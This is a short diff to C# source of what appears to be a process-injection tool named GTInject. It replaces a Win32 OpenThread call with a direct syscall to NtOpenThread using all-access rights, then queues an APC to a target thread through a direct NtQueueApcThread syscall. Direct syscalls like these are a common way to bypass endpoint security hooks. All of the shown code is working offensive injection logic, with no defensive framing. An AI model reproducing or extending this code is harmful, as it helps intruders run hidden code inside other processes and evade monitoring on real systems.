@@ -9,6 +9,7 @@ using System.Xml.Linq;
 using GTInject.SysCalls;
 using System.Linq.Expressions;
 using static GTInject.SysCalls.WinNative;
+using System.Security.Cryptography;
 
 namespace GTInject.Injection
 {
@@ -264,13 +265,19 @@ namespace GTInject.Injection
             /////////////////////////////////////
             // OPTION 301 == Direct Syscall - NtQueueApcThread, NtResumeThread
             /////////////////////////////////////
-
-            var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
+            var targetThread = IntPtr.Zero;
+            var cid = new CLIENT_ID { UniqueThread = (IntPtr)ThreadID };
+            OBJECT_ATTRIBUTES objAttributes = new OBJECT_ATTRIBUTES();
+            var status = Syscalls.SysclNtOpenThread(out targetThread, (uint)ThreadAccessRights.AllAccess, ref objAttributes, ref cid);
+            Console.WriteLine("     Direct Syscall NTOpenThread status " + status);
+            Console.WriteLine("     Target thread handle " + targetThread);
+            //var NtOpenTResp = NtOpenThread(out targetThread, (uint)ThreadAccessRights.AllAccess, ref objAttributes, ref cid);
+            //var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
 
             // set up the syscall for NtQueueApcThread
             var hProcess = ProcID.Handle;
             IntPtr hThread = IntPtr.Zero;
-            var status = Syscalls.SysclNtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
+            status = Syscalls.SysclNtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
             Console.WriteLine("     Direct Syscall to NtQueueApcThread " + status);
 
             if (status != 0)
